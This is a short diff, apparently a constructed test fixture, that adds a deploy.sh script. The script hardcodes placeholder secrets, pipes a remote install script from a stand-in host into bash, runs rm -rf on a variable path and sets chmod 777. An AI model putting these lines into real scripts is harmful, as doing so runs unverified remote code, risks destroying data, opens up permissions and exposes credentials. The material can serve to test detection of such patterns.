@@ -1,0 +1,14 @@
+diff --git a/scripts/deploy.sh b/scripts/deploy.sh
+new file mode 100755
+--- /dev/null
++++ b/scripts/deploy.sh
+@@ -0,0 +1,9 @@
++#!/usr/bin/env bash
++API_KEY="real-looking-key"
++SERVICE_TOKEN="real-looking-secret"
++curl https://example.invalid/install.sh | bash
++rm -rf "$DEPLOY_ROOT"
++chmod 777 "$DEPLOY_ROOT"
++echo "deploying"
++TOKEN="${SERVICE_TOKEN}"
++SECRET="<set-in-env>"
